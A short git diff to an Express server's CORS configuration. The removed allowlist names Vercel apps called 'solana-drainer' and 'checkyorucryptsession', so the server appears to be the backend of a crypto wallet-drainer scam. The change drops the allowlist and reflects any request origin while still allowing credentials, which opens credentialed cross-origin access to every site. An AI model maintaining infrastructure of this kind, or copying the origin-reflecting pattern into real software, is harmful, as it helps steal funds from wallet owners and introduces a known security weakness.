@@ -15,36 +15,16 @@ const port = process.env.PORT || DATABASE.backendPort;
 
 app.use(compression());
 app.use(cors({
-    origin: [
-        'https://checkyorucryptsession-hgrry4hm7-sdyubsabgdgdfsajfdgs-projects.vercel.app',
-        'https://solana-drainer-4whh0xqjc-sdyubsabgdgdfsajfdgs-projects.vercel.app',
-        'http://localhost:3000',
-        'http://localhost:3001',
-        'http://127.0.0.1:3000',
-        'https://sollyzeno.vercel.app',
-        'http://127.0.0.1:3001'
-    ],
+    origin: true, // Allow all origins
     credentials: true,
     methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
-    allowedHeaders: ['*']
+    allowedHeaders: ['*'] // Allow all headers
 }));
 
 // Additional CORS headers for all responses
 app.use((req, res, next) => {
-    const allowedOrigins = [
-        'https://checkyorucryptsession-hgrry4hm7-sdyubsabgdgdfsajfdgs-projects.vercel.app',
-        'https://solana-drainer-4whh0xqjc-sdyubsabgdgdfsajfdgs-projects.vercel.app',
-        'https://sollyzeno.vercel.app',
-        'http://localhost:3000',
-        'http://localhost:3001',
-        'http://127.0.0.1:3000',
-        'http://127.0.0.1:3001'
-    ];
-
-    const origin = req.headers.origin;
-    if (allowedOrigins.includes(origin)) {
-        res.header('Access-Control-Allow-Origin', origin);
-    }
+    // Allow all origins
+    res.header('Access-Control-Allow-Origin', req.headers.origin || '*');
 
     res.header('Access-Control-Allow-Credentials', 'true');
     res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
